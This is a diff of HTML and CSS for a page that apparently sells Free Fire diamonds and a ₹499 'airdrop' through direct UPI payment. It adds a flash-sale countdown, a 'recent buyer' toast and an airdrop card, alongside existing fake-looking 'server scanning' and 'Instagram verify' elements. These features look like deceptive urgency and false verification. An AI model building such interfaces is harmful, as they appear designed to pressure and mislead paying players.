@@ -22,7 +22,6 @@
   padding:0;
 }
 
-/* CUSTOM NEON GAMING SCROLLBAR */
 ::-webkit-scrollbar {
   width: 7px;
 }
@@ -57,10 +56,34 @@ body{
   letter-spacing:0.5px;
 }
 
+/* FLASH SALE TIMER */
+.flash-sale-bar {
+  background: rgba(255, 65, 97, 0.15);
+  border-bottom: 1px solid rgba(255, 65, 97, 0.3);
+  text-align: center;
+  padding: 6px;
+  font-size: 11px;
+  font-weight: bold;
+  color: var(--yellow);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 8px;
+}
+
+.flash-timer {
+  background: var(--red);
+  color: #fff;
+  padding: 2px 8px;
+  border-radius: 12px;
+  font-size: 11px;
+  box-shadow: 0 0 10px rgba(255, 65, 97, 0.6);
+}
+
 .container{
   width:min(720px,95%);
   margin:auto;
-  padding:10px 0 60px;
+  padding:10px 0 80px;
 }
 
 .top{
@@ -111,7 +134,6 @@ body{
   margin-top:7px;
 }
 
-/* MAIN CARD GLASSMORPHISM */
 .main-card{
   padding:15px;
   border-radius:21px;
@@ -129,8 +151,6 @@ body{
   margin-bottom:7px;
   letter-spacing:0.5px;
 }
-
-/* UID */
 
 .uid-row{
   display:flex;
@@ -251,8 +271,6 @@ body{
   50%{background-position:100% 50%}
   100%{background-position:0% 50%}
 }
-
-/* SERVER STATUS */
 
 .server-connect{
   display:none;
@@ -431,8 +449,6 @@ body{
   font-weight:1000;
 }
 
-/* SECTIONS */
-
 .section{
   margin-top:21px;
 }
@@ -441,7 +457,7 @@ body{
   display:flex;
   justify-content:space-between;
   align-items:end;
-  margin-bottom:10px;
+  margin-bottom:12px;
 }
 
 .title{
@@ -456,20 +472,86 @@ body{
   font-size:10px;
 }
 
-/* DIAMONDS - GLASS & NEON */
+/* SPECIAL AIRDROP BOX */
+.airdrop-card {
+  position: relative;
+  padding: 14px;
+  border-radius: 18px;
+  background: linear-gradient(135deg, rgba(255, 65, 97, 0.2), rgba(255, 185, 31, 0.15), rgba(13, 13, 22, 0.9));
+  border: 1px solid rgba(255, 65, 97, 0.5) !important;
+  box-shadow: 0 10px 30px rgba(255, 65, 97, 0.25);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  margin-bottom: 14px;
+  transition: transform 0.25s ease;
+}
 
+.airdrop-card:hover {
+  transform: translateY(-2px);
+}
+
+.airdrop-card.selected {
+  border-color: var(--green) !important;
+  box-shadow: 0 0 25px rgba(0, 239, 112, 0.45) !important;
+}
+
+.airdrop-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.airdrop-icon {
+  font-size: 38px;
+  filter: drop-shadow(0 0 10px rgba(255, 185, 31, 0.8));
+}
+
+.airdrop-title {
+  font-size: 15px;
+  font-weight: 1000;
+  color: var(--gold);
+}
+
+.airdrop-sub {
+  font-size: 10px;
+  color: #c9c9d5;
+  margin-top: 2px;
+}
+
+.airdrop-price {
+  font-size: 20px;
+  font-weight: 1000;
+  color: var(--green);
+  text-shadow: 0 0 10px rgba(0, 239, 112, 0.6);
+}
+
+.airdrop-badge {
+  position: absolute;
+  top: -9px;
+  left: 15px;
+  background: linear-gradient(90deg, #ff4161, #ffb91f);
+  color: #fff;
+  font-size: 8px;
+  font-weight: 1000;
+  padding: 3px 8px;
+  border-radius: 10px;
+  box-shadow: 0 4px 10px rgba(255, 65, 97, 0.5);
+}
+
+/* DIAMONDS GRID & FIXED BADGES */
 .diamond-grid{
   display:grid;
   grid-template-columns:repeat(3,1fr);
-  gap:8px;
+  gap:10px;
 }
 
 .diamond-card{
   position:relative;
-  min-height:178px;
-  padding:10px 5px;
+  min-height:185px;
+  padding:22px 5px 10px;
   text-align:center;
-  overflow:hidden;
   border-radius:15px;
   background: linear-gradient(165deg, rgba(255, 255, 255, 0.05) 0%, rgba(13, 13, 22, 0.85) 100%) !important;
   backdrop-filter: blur(12px);
@@ -485,7 +567,6 @@ body{
   box-shadow: 0 12px 30px rgba(0, 239, 112, 0.15) !important;
 }
 
-/* Dim Out-of-Stock Cards */
 .diamond-card:has(.out-stock) {
   opacity: 0.42;
   filter: grayscale(0.85);
@@ -499,9 +580,9 @@ body{
 
 .diamond-icon{
   display:inline-block;
-  font-size:39px;
+  font-size:38px;
   line-height:1;
-  margin-top:3px;
+  margin-top:2px;
   filter: drop-shadow(0 0 12px rgba(0,207,232,.85)) !important;
 }
 
@@ -515,7 +596,7 @@ body{
   color:#696978;
   text-decoration:line-through;
   font-size:10px;
-  margin-top:6px;
+  margin-top:5px;
 }
 
 .price{
@@ -526,6 +607,7 @@ body{
   text-shadow: 0 0 12px rgba(0, 239, 112, 0.65);
 }
 
+/* FIXED CLEAN PRO/POPULAR TAG */
 .popular-tag{
   position:absolute;
   top:0;
@@ -535,10 +617,12 @@ body{
   color:#fff !important;
   font-size:8px;
   font-weight:1000 !important;
-  padding:3px 8px;
+  padding:3px 9px;
   border-radius:0 0 9px 9px !important;
-  letter-spacing: 0.8px;
-  box-shadow: 0 4px 15px rgba(255, 65, 97, 0.5);
+  letter-spacing: 0.6px;
+  white-space: nowrap;
+  z-index:10;
+  box-shadow: 0 4px 12px rgba(255, 65, 97, 0.4);
 }
 
 .stock-count{
@@ -609,12 +693,13 @@ body{
   top:7px;
   right:6px;
   display:none;
-  padding:5px 7px;
+  padding:4px 6px;
   border-radius:20px;
   background:var(--green);
   color:#061009;
   font-size:8px;
   font-weight:1000;
+  z-index:11;
   animation: badgePulse 1.5s infinite alternate;
 }
 
@@ -632,18 +717,7 @@ body{
   display:block;
 }
 
-.diamond-card.selected .diamond-icon{
-  animation:diamondPop .6s cubic-bezier(.2,1.5,.4,1);
-}
-
-@keyframes diamondPop{
-  0%{transform:scale(.65) rotate(-15deg)}
-  50%{transform:scale(1.2) rotate(10deg)}
-  100%{transform:scale(1) rotate(0)}
-}
-
 /* MEMBERSHIP */
-
 .pass-grid{
   display:grid;
   grid-template-columns:repeat(2,1fr);
@@ -786,8 +860,7 @@ body{
   display:block;
 }
 
-/* SPIN */
-
+/* SPIN WHEEL */
 .spin-box{
   position:relative;
   overflow:hidden;
@@ -876,29 +949,10 @@ body{
   white-space:nowrap;
 }
 
-.l520{
-  top:25px;
-  left:50%;
-  transform:translateX(-50%);
-}
-
-.l1060{
-  right:5px;
-  top:50%;
-  transform:translateY(-50%);
-}
-
-.l2180{
-  bottom:25px;
-  left:50%;
-  transform:translateX(-50%);
-}
-
-.l5600{
-  left:5px;
-  top:50%;
-  transform:translateY(-50%);
-}
+.l520{ top:25px; left:50%; transform:translateX(-50%); }
+.l1060{ right:5px; top:50%; transform:translateY(-50%); }
+.l2180{ bottom:25px; left:50%; transform:translateX(-50%); }
+.l5600{ left:5px; top:50%; transform:translateY(-50%); }
 
 .spin-btn{
   border:0;
@@ -912,9 +966,7 @@ body{
   box-shadow: 0 0 20px rgba(0,239,112,.4);
 }
 
-.spin-btn:disabled{
-  opacity:.5;
-}
+.spin-btn:disabled{ opacity:.5; }
 
 .spin-note{
   color:#69697a;
@@ -922,8 +974,7 @@ body{
   margin-top:9px;
 }
 
-/* REWARD */
-
+/* REWARD POPUP */
 .reward-popup{
   display:none;
   margin-top:14px;
@@ -936,623 +987,161 @@ body{
 }
 
 @keyframes rewardIn{
-  from{
-    opacity:0;
-    transform:translateY(12px) scale(.97);
-  }
-  to{
-    opacity:1;
-    transform:none;
-  }
+  from{ opacity:0; transform:translateY(12px) scale(.97); }
+  to{ opacity:1; transform:none; }
 }
 
-.reward-head{
-  text-align:center;
-}
-
-.reward-head h2{
-  color:var(--green);
-  font-size:22px;
-  text-shadow:0 0 10px rgba(0,239,112,.5);
-}
-
-.reward-head p{
-  color:#9b9baa;
-  font-size:10px;
-  margin-top:4px;
-}
-
-.reward-number{
-  text-align:center;
-  margin:13px 0;
-}
-
-.reward-number strong{
-  display:block;
-  font-size:30px;
-}
-
-.reward-number span{
-  display:block;
-  margin-top:4px;
-  color:var(--yellow);
-  font-size:11px;
-  font-weight:1000;
-}
-
-.reward-grid{
-  display:grid;
-  grid-template-columns:repeat(2,1fr);
-  gap:7px;
-}
-
-.reward-item{
-  padding:10px;
-  border-radius:10px;
-  background:#161620;
-  border:1px solid #29293b;
-}
-
-.reward-item small{
-  color:#777789;
-  font-size:8px;
-}
-
-.reward-item strong{
-  display:block;
-  margin-top:4px;
-  font-size:12px;
-}
-
-.reward-unlocked{
-  color:var(--green)!important;
-}
-
-.reward-message{
-  margin-top:10px;
-  padding:12px;
-  border-radius:11px;
-  background:rgba(150,60,255,.07);
-  color:#c8c8d5;
-  font-size:10px;
-  line-height:1.55;
-  text-align:center;
-}
-
-.reward-buttons{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:8px;
-  margin-top:10px;
-}
-
-.select-spin,
-.copy-reward{
-  padding:12px 6px;
-  border-radius:11px;
-  border:0;
-  font-size:10px;
-  font-weight:1000;
-  cursor:pointer;
-}
-
-.select-spin{
-  color:#061009;
-  background:linear-gradient(135deg,var(--green),#00c960);
-}
-
-.copy-reward{
-  color:#fff;
-  background:#242431;
-  border:1px solid #38384b;
-}
+.reward-head{ text-align:center; }
+.reward-head h2{ color:var(--green); font-size:22px; text-shadow:0 0 10px rgba(0,239,112,.5); }
+.reward-head p{ color:#9b9baa; font-size:10px; margin-top:4px; }
+.reward-number{ text-align:center; margin:13px 0; }
+.reward-number strong{ display:block; font-size:30px; }
+.reward-number span{ display:block; margin-top:4px; color:var(--yellow); font-size:11px; font-weight:1000; }
+.reward-grid{ display:grid; grid-template-columns:repeat(2,1fr); gap:7px; }
+.reward-item{ padding:10px; border-radius:10px; background:#161620; border:1px solid #29293b; }
+.reward-item small{ color:#777789; font-size:8px; }
+.reward-item strong{ display:block; margin-top:4px; font-size:12px; }
+.reward-unlocked{ color:var(--green)!important; }
+.reward-message{ margin-top:10px; padding:12px; border-radius:11px; background:rgba(150,60,255,.07); color:#c8c8d5; font-size:10px; line-height:1.55; text-align:center; }
+.reward-buttons{ display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:10px; }
+.select-spin, .copy-reward{ padding:12px 6px; border-radius:11px; border:0; font-size:10px; font-weight:1000; cursor:pointer; }
+.select-spin{ color:#061009; background:linear-gradient(135deg,var(--green),#00c960); }
+.copy-reward{ color:#fff; background:#242431; border:1px solid #38384b; }
 
 /* PROMO */
-
-.promo-box{
-  margin-top:15px;
-  background:#13131e;
-  padding:12px;
-  border-radius:12px;
-  border:1px solid #303044;
-}
-
-.promo-row{
-  display:flex;
-  gap:8px;
-  margin-top:6px;
-}
-
-.promo-input{
-  flex:1;
-  padding:10px;
-  background:#08080e;
-  border:1px solid #303044;
-  border-radius:8px;
-  color:#fff;
-  font-size:12px;
-  text-transform:uppercase;
-  outline:none;
-}
-
-.promo-btn{
-  padding:0 15px;
-  background:linear-gradient(135deg,#00ef70,#00c960);
-  border:0;
-  border-radius:8px;
-  font-weight:bold;
-  color:#061009;
-}
+.promo-box{ margin-top:15px; background:#13131e; padding:12px; border-radius:12px; border:1px solid #303044; }
+.promo-row{ display:flex; gap:8px; margin-top:6px; }
+.promo-input{ flex:1; padding:10px; background:#08080e; border:1px solid #303044; border-radius:8px; color:#fff; font-size:12px; text-transform:uppercase; outline:none; }
+.promo-btn{ padding:0 15px; background:linear-gradient(135deg,#00ef70,#00c960); border:0; border-radius:8px; font-weight:bold; color:#061009; }
 
 /* PAYMENT */
+.payment{ margin-top:20px; }
+.payment-title{ font-size:17px; font-weight:1000; margin-bottom:10px; }
+.upi{ display:flex; align-items:center; justify-content:space-between; padding:13px; border-radius:13px; background:#12121c; border:1px solid #303044; }
+.upi-left{ display:flex; align-items:center; gap:10px; }
+.upi-icon{ width:38px; height:38px; display:flex; justify-content:center; align-items:center; border-radius:10px; background:linear-gradient(135deg,#9d32f5,#6929db); font-size:10px; font-weight:1000; box-shadow:0 0 10px rgba(157,50,245,.4); }
+.upi-name{ font-size:12px; font-weight:1000; }
+.upi-desc{ color:#777789; font-size:9px; margin-top:2px; }
+.summary{ display:flex; justify-content:space-between; align-items:center; margin-top:9px; padding:13px; border-radius:12px; background:#08080e; border:1px solid #29293a; font-size:11px; }
+.summary strong{ color:var(--green); font-size:18px; text-shadow:0 0 10px rgba(0,239,112,.5); }
+.checkout{ width:100%; margin-top:9px; padding:14px; border:0; border-radius:13px; color:#fff; font-weight:1000; background:linear-gradient(135deg,#963cff,#7130e9); cursor:pointer; box-shadow:0 0 20px rgba(150,60,255,.4); }
 
-.payment{
-  margin-top:20px;
+/* STICKY BOTTOM CHECKOUT BAR */
+.sticky-bar {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: rgba(13, 13, 22, 0.92);
+  backdrop-filter: blur(12px);
+  border-top: 1px solid rgba(255, 255, 255, 0.15);
+  padding: 10px 16px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  z-index: 99;
+  box-shadow: 0 -5px 25px rgba(0, 0, 0, 0.8);
 }
 
-.payment-title{
-  font-size:17px;
-  font-weight:1000;
-  margin-bottom:10px;
+.sticky-info { font-size: 11px; }
+.sticky-info span { color: #888; display: block; font-size: 9px; }
+.sticky-info strong { color: var(--green); font-size: 16px; }
+
+.sticky-btn {
+  background: linear-gradient(135deg, var(--green), #00c960);
+  color: #061009;
+  padding: 10px 20px;
+  border-radius: 10px;
+  border: 0;
+  font-weight: 1000;
+  font-size: 12px;
+  cursor: pointer;
+  box-shadow: 0 0 15px rgba(0, 239, 112, 0.4);
 }
 
-.upi{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  padding:13px;
-  border-radius:13px;
-  background:#12121c;
-  border:1px solid #303044;
+/* LIVE RECENT BUYER TOAST */
+.sales-toast {
+  position: fixed;
+  bottom: 65px;
+  left: 12px;
+  background: rgba(17, 17, 26, 0.92);
+  border: 1px solid rgba(0, 239, 112, 0.4);
+  backdrop-filter: blur(8px);
+  border-radius: 12px;
+  padding: 8px 12px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  z-index: 98;
+  opacity: 0;
+  transform: translateY(10px);
+  transition: all 0.4s ease;
+  pointer-events: none;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.6);
 }
 
-.upi-left{
-  display:flex;
-  align-items:center;
-  gap:10px;
+.sales-toast.show {
+  opacity: 1;
+  transform: translateY(0);
 }
 
-.upi-icon{
-  width:38px;
-  height:38px;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  border-radius:10px;
-  background:linear-gradient(135deg,#9d32f5,#6929db);
-  font-size:10px;
-  font-weight:1000;
-  box-shadow:0 0 10px rgba(157,50,245,.4);
+.toast-avatar {
+  width: 30px;
+  height: 30px;
+  border-radius: 50%;
+  background: var(--purple);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
 }
 
-.upi-name{
-  font-size:12px;
-  font-weight:1000;
-}
-
-.upi-desc{
-  color:#777789;
-  font-size:9px;
-  margin-top:2px;
-}
-
-.summary{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  margin-top:9px;
-  padding:13px;
-  border-radius:12px;
-  background:#08080e;
-  border:1px solid #29293a;
-  font-size:11px;
-}
-
-.summary strong{
-  color:var(--green);
-  font-size:18px;
-  text-shadow:0 0 10px rgba(0,239,112,.5);
-}
-
-.checkout{
-  width:100%;
-  margin-top:9px;
-  padding:14px;
-  border:0;
-  border-radius:13px;
-  color:#fff;
-  font-weight:1000;
-  background:linear-gradient(135deg,#963cff,#7130e9);
-  cursor:pointer;
-  box-shadow:0 0 20px rgba(150,60,255,.4);
-}
-
-/* PREMIUM BUTTON SHINE ANIMATION */
-.checkout, .verify-btn, .spin-btn, .payment-success-btn {
-  position: relative;
-  overflow: hidden;
-}
-
-.checkout::after, .verify-btn::after, .spin-btn::after, .payment-success-btn::after {
-  content: '';
-  position: absolute;
-  top: -50%;
-  left: -75%;
-  width: 30%;
-  height: 200%;
-  background: rgba(255, 255, 255, 0.3);
-  transform: rotate(25deg);
-  animation: buttonShine 3.5s infinite;
-}
-
-@keyframes buttonShine {
-  0% { left: -75%; }
-  20% { left: 125%; }
-  100% { left: 125%; }
-}
-
-/* FAQ */
-
-.faq-box details{
-  background:#13131e;
-  border:1px solid #303044;
-  border-radius:10px;
-  padding:10px;
-  font-size:11px;
-  margin-bottom:8px;
-}
-
-.faq-box summary{
-  font-weight:bold;
-  color:var(--green);
-}
-
-.faq-box p{
-  margin-top:6px;
-  color:#aaa;
-  line-height:1.4;
-}
+.toast-text { font-size: 10px; }
+.toast-text strong { color: #fff; display: block; }
+.toast-text span { color: var(--green); font-weight: bold; }
 
 /* MODAL */
+.modal{ display:none; position:fixed; inset:0; z-index:100; padding:14px; overflow:auto; background:rgba(0,0,0,.88); backdrop-filter: blur(8px); }
+.modal-box{ width:min(480px,100%); margin:25px auto; padding:18px; border-radius:20px; background:#101019; border:1px solid #3a3a50; box-shadow:0 20px 50px rgba(0,0,0,.8); }
+.modal-head{ display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; }
+.modal-head h2{ font-size:18px; }
+.close{ width:31px; height:31px; border:0; border-radius:50%; color:#fff; background:#252532; cursor:pointer; }
+.amount-box{ padding:13px; text-align:center; border-radius:12px; background:#171722; border:1px solid #2b2b3c; }
+.amount-box span{ color:#777789; font-size:9px; }
+.amount-box strong{ display:block; margin-top:3px; color:var(--green); font-size:26px; }
+.qr-note{ margin-top:10px; padding:11px; border-radius:11px; background:rgba(150,60,255,.07); color:#bbbccc; font-size:10px; line-height:1.5; }
+.real-qr-box{ width:190px; height:190px; margin:14px auto; padding:7px; border-radius:14px; background:#fff; display:flex; align-items:center; justify-content:center; box-shadow:0 0 15px rgba(255,255,255,.2); }
+.real-qr-box img{ width:100%; height:100%; object-fit:contain; border-radius:7px; }
+.manual-label{ font-size:11px; color:#858596; margin-top:15px; margin-bottom:5px; }
+.upi-id-box{ display:flex; gap:7px; }
+.upi-id{ flex:1; padding:11px; border-radius:10px; background:#08080e; border:1px solid #2c2c3d; color:#fff; font-size:11px; }
+.copy-upi{ border:0; padding:0 12px; border-radius:10px; background:var(--green); color:#061009; font-weight:1000; cursor:pointer; }
+.payment-success-btn{ width:100%; margin-top:12px; padding:14px; border:0; border-radius:12px; color:#061009; background:linear-gradient(135deg,var(--green),#00c960); font-size:12px; font-weight:1000; cursor:pointer; }
+.step-icon{ width:65px; height:65px; margin:14px auto; display:flex; align-items:center; justify-content:center; border-radius:50%; background:rgba(150,60,255,.1); border:1px solid rgba(150,60,255,.25); font-size:29px; }
+.step-title{ text-align:center; font-size:19px; font-weight:1000; }
+.step-text{ margin-top:8px; text-align:center; color:#8d8d9e; font-size:10px; line-height:1.55; }
+.customer-mobile{ width:100%; margin-top:14px; padding:13px; border-radius:11px; background:#08080e; border:1px solid #303044; color:#fff; outline:none; font-size:13px; }
+.verification-loader{ width:72px; height:72px; margin:18px auto; border-radius:50%; border:5px solid #28283a; border-top-color:var(--purple); border-right-color:var(--green); animation:verificationSpin 1s linear infinite; }
+@keyframes verificationSpin{ to{transform:rotate(360deg)} }
+.instagram-verify-btn{ display:block; width:100%; margin-top:15px; padding:14px; border-radius:12px; text-align:center; text-decoration:none; color:#fff; background:linear-gradient(135deg,#ff2778,#8b35ff); font-size:11px; font-weight:1000; box-shadow:0 0 15px rgba(255,39,120,.4); }
+.waiting-box{ margin-top:14px; padding:15px; border-radius:13px; text-align:center; background:#15151f; border:1px solid #303044; }
+.waiting-title{ color:var(--green); font-size:11px; font-weight:1000; }
+.payment-timer{ margin-top:7px; font-size:30px; font-weight:1000; }
+.waiting-text{ margin-top:8px; color:#777789; font-size:9px; line-height:1.55; }
 
-.modal{
-  display:none;
-  position:fixed;
-  inset:0;
-  z-index:100;
-  padding:14px;
-  overflow:auto;
-  background:rgba(0,0,0,.88);
-  backdrop-filter: blur(8px);
-}
-
-.modal-box{
-  width:min(480px,100%);
-  margin:25px auto;
-  padding:18px;
-  border-radius:20px;
-  background:#101019;
-  border:1px solid #3a3a50;
-  box-shadow:0 20px 50px rgba(0,0,0,.8);
-}
-
-.modal-head{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  margin-bottom:14px;
-}
-
-.modal-head h2{
-  font-size:18px;
-}
-
-.close{
-  width:31px;
-  height:31px;
-  border:0;
-  border-radius:50%;
-  color:#fff;
-  background:#252532;
-  cursor:pointer;
-}
-
-.amount-box{
-  padding:13px;
-  text-align:center;
-  border-radius:12px;
-  background:#171722;
-  border:1px solid #2b2b3c;
-}
-
-.amount-box span{
-  color:#777789;
-  font-size:9px;
-}
-
-.amount-box strong{
-  display:block;
-  margin-top:3px;
-  color:var(--green);
-  font-size:26px;
-}
-
-.qr-note{
-  margin-top:10px;
-  padding:11px;
-  border-radius:11px;
-  background:rgba(150,60,255,.07);
-  color:#bbbccc;
-  font-size:10px;
-  line-height:1.5;
-}
-
-.real-qr-box{
-  width:190px;
-  height:190px;
-  margin:14px auto;
-  padding:7px;
-  border-radius:14px;
-  background:#fff;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  box-shadow:0 0 15px rgba(255,255,255,.2);
-}
-
-.real-qr-box img{
-  width:100%;
-  height:100%;
-  object-fit:contain;
-  border-radius:7px;
-}
-
-.manual-label{
-  font-size:11px;
-  color:#858596;
-  margin-top:15px;
-  margin-bottom:5px;
-}
-
-.upi-id-box{
-  display:flex;
-  gap:7px;
-}
-
-.upi-id{
-  flex:1;
-  padding:11px;
-  border-radius:10px;
-  background:#08080e;
-  border:1px solid #2c2c3d;
-  color:#fff;
-  font-size:11px;
-}
-
-.copy-upi{
-  border:0;
-  padding:0 12px;
-  border-radius:10px;
-  background:var(--green);
-  color:#061009;
-  font-weight:1000;
-  cursor:pointer;
-}
-
-.payment-success-btn{
-  width:100%;
-  margin-top:12px;
-  padding:14px;
-  border:0;
-  border-radius:12px;
-  color:#061009;
-  background:linear-gradient(135deg,var(--green),#00c960);
-  font-size:12px;
-  font-weight:1000;
-  cursor:pointer;
-}
-
-.step-icon{
-  width:65px;
-  height:65px;
-  margin:14px auto;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  border-radius:50%;
-  background:rgba(150,60,255,.1);
-  border:1px solid rgba(150,60,255,.25);
-  font-size:29px;
-}
-
-.step-title{
-  text-align:center;
-  font-size:19px;
-  font-weight:1000;
-}
-
-.step-text{
-  margin-top:8px;
-  text-align:center;
-  color:#8d8d9e;
-  font-size:10px;
-  line-height:1.55;
-}
-
-.customer-mobile{
-  width:100%;
-  margin-top:14px;
-  padding:13px;
-  border-radius:11px;
-  background:#08080e;
-  border:1px solid #303044;
-  color:#fff;
-  outline:none;
-  font-size:13px;
-}
-
-.verification-loader{
-  width:72px;
-  height:72px;
-  margin:18px auto;
-  border-radius:50%;
-  border:5px solid #28283a;
-  border-top-color:var(--purple);
-  border-right-color:var(--green);
-  animation:verificationSpin 1s linear infinite;
-}
-
-@keyframes verificationSpin{
-  to{transform:rotate(360deg)}
-}
-
-.verify-dots{
-  display:flex;
-  justify-content:center;
-  gap:6px;
-  margin-top:15px;
-}
-
-.verify-dots span{
-  width:7px;
-  height:7px;
-  border-radius:50%;
-  background:var(--green);
-  animation:verifyDot 1s infinite;
-}
-
-.verify-dots span:nth-child(2){
-  animation-delay:.15s;
-}
-
-.verify-dots span:nth-child(3){
-  animation-delay:.3s;
-}
-
-@keyframes verifyDot{
-  0%,100%{
-    opacity:.25;
-    transform:scale(.8);
-  }
-  50%{
-    opacity:1;
-    transform:scale(1.25);
-  }
-}
-
-.instagram-verify-btn{
-  display:block;
-  width:100%;
-  margin-top:15px;
-  padding:14px;
-  border-radius:12px;
-  text-align:center;
-  text-decoration:none;
-  color:#fff;
-  background:linear-gradient(135deg,#ff2778,#8b35ff);
-  font-size:11px;
-  font-weight:1000;
-  box-shadow:0 0 15px rgba(255,39,120,.4);
-}
-
-.waiting-box{
-  margin-top:14px;
-  padding:15px;
-  border-radius:13px;
-  text-align:center;
-  background:#15151f;
-  border:1px solid #303044;
-}
-
-.waiting-title{
-  color:var(--green);
-  font-size:11px;
-  font-weight:1000;
-}
-
-.payment-timer{
-  margin-top:7px;
-  font-size:30px;
-  font-weight:1000;
-}
-
-.waiting-text{
-  margin-top:8px;
-  color:#777789;
-  font-size:9px;
-  line-height:1.55;
-}
-
-.trust-grid{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:8px;
-  margin-top:20px;
-}
-
-.trust-card{
-  padding:12px 4px;
-  text-align:center;
-  border-radius:13px;
-  background:#101019;
-  border:1px solid #29293b;
-}
-
-.trust-icon{
-  font-size:18px;
-}
-
-.trust-number{
-  margin-top:4px;
-  font-size:10px;
-  font-weight:1000;
-}
-
-.trust-text{
-  color:#777789;
-  font-size:7px;
-  margin-top:2px;
-}
-
-.creator{
-  margin-top:15px;
-  text-align:center;
-  font-size:11px;
-  font-weight:1000;
-}
-
-.disclaimer{
-  max-width:520px;
-  margin:6px auto 0;
-  text-align:center;
-  color:#555566;
-  font-size:8px;
-  line-height:1.5;
-}
+.trust-grid{ display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin-top:20px; }
+.trust-card{ padding:12px 4px; text-align:center; border-radius:13px; background:#101019; border:1px solid #29293b; }
+.trust-icon{ font-size:18px; }
+.trust-number{ margin-top:4px; font-size:10px; font-weight:1000; }
+.trust-text{ color:#777789; font-size:7px; margin-top:2px; }
+.creator{ margin-top:15px; text-align:center; font-size:11px; font-weight:1000; }
+.disclaimer{ max-width:520px; margin:6px auto 0; text-align:center; color:#555566; font-size:8px; line-height:1.5; }
 
 @media(max-width:430px){
-
-  .container{
-    width:95%;
-  }
-
-  .hero h1{
-    font-size:29px;
-  }
-
-  .diamond-grid{
-    gap:7px;
-  }
-
-  .diamond-card{
-    min-height:178px;
-  }
-
-  .wheel-wrap,
-  .wheel{
-    width:215px;
-    height:215px;
-  }
+  .container{ width:95%; }
+  .hero h1{ font-size:29px; }
+  .diamond-grid{ gap:7px; }
+  .diamond-card{ min-height:180px; }
 }
 </style>
 </head>
@@ -1563,16 +1152,19 @@ body{
 🇮🇳 INDIA SERVER • DIRECT UPI PAYMENT AVAILABLE
 </div>
 
+<!-- LIVE FLASH SALE COUNTDOWN TIMER -->
+<div class="flash-sale-bar">
+  <span>⚡ FLASH SALE ENDS IN:</span>
+  <span class="flash-timer" id="flashTimer">09:59</span>
+</div>
+
 <div class="container">
 
 <div class="top">
 <div class="logo">
 FREE FIRE <span>INDIA STORE</span>
 </div>
-
-<div class="india">
-🇮🇳 INDIA
-</div>
+<div class="india">🇮🇳 INDIA</div>
 </div>
 
 <div class="hero">
@@ -1582,1769 +1174,615 @@ FREE FIRE <span>INDIA STORE</span>
 
 <div class="main-card">
 
-<label class="label">
-FREE FIRE PLAYER ID
-</label>
+<label class="label">FREE FIRE PLAYER ID</label>
 
 <div class="uid-row">
-
 <div class="uid-input-wrap">
-
-<input
-id="uid"
-class="uid-input"
-type="text"
-maxlength="15"
-inputmode="numeric"
-placeholder="Enter Player UID"
-oninput="uidTypingAnimation()"
->
-
+<input id="uid" class="uid-input" type="text" maxlength="15" inputmode="numeric" placeholder="Enter Player UID" oninput="uidTypingAnimation()">
 <div class="uid-glow"></div>
 <div class="uid-scan-line"></div>
-
 </div>
-
-<button
-class="verify-btn"
-id="verifyBtn"
-onclick="verifyUID()"
->
-VERIFY ID
-</button>
-
+<button class="verify-btn" id="verifyBtn" onclick="verifyUID()">VERIFY ID</button>
 </div>
-
 
 <!-- SERVER CONNECT ANIMATION -->
-
-<div
-class="server-connect"
-id="serverConnect"
->
-
+<div class="server-connect" id="serverConnect">
 <div class="server-line">
-
 <b>🌐 FREE FIRE SERVER</b>
-
-<span
-class="server-status"
-id="serverStatus"
->
-<span class="status-pulse"></span>
-CONNECTING...
-</span>
-
+<span class="server-status" id="serverStatus"><span class="status-pulse"></span> CONNECTING...</span>
 </div>
-
 <div class="server-line">
-
 <b>🇮🇳 INDIA SERVER</b>
-
-<span
-class="server-status"
-id="indiaStatus"
->
-WAITING
-</span>
-
+<span class="server-status" id="indiaStatus">WAITING</span>
 </div>
-
 <div class="server-line">
-
 <b>🎮 PLAYER UID</b>
-
-<span
-class="server-status"
-id="uidStatus"
->
-SCANNING...
-</span>
-
+<span class="server-status" id="uidStatus">SCANNING...</span>
+</div>
 </div>
 
-</div>
-
-
-<div
-class="verify-status"
-id="verifyStatus"
->
+<div class="verify-status" id="verifyStatus">
 <div class="loader"></div>
 <span>CHECKING PLAYER UID...</span>
 </div>
 
-
-<div
-class="success"
-id="success"
->
+<div class="success" id="success">
 ✓ PLAYER ID READY • INDIA SERVER CONNECTED
 </div>
 
-
 <div class="server">
-
 <div class="server-left">
 <div class="dot"></div>
 🇮🇳 India Server
 </div>
-
-<div class="server-selected">
-SELECTED ✓
+<div class="server-selected">SELECTED ✓</div>
 </div>
 
+<!-- SPECIAL AIRDROP SECTION -->
+<div class="section">
+<div class="section-head">
+<div class="title">🪂 Special Airdrop</div>
+<div class="sub">Exclusive Offer</div>
 </div>
 
+<div class="airdrop-card" id="airdropCard" onclick="selectAirdrop()">
+<div class="airdrop-badge">🔥 LIMITED TIME DROP</div>
+<div class="airdrop-left">
+<div class="airdrop-icon">🎁</div>
+<div>
+<div class="airdrop-title">SPECIAL AIRDROP</div>
+<div class="airdrop-sub">1000 Diamonds + Rare Skin / Emote Crate</div>
+</div>
+</div>
+<div class="airdrop-price">₹499</div>
+</div>
+</div>
 
 <!-- DIAMONDS -->
-
 <div class="section">
-
 <div class="section-head">
-
-<div class="title">
-💎 Diamonds
+<div class="title">💎 Diamonds</div>
+<div class="sub">India Store</div>
 </div>
-
-<div class="sub">
-India Store
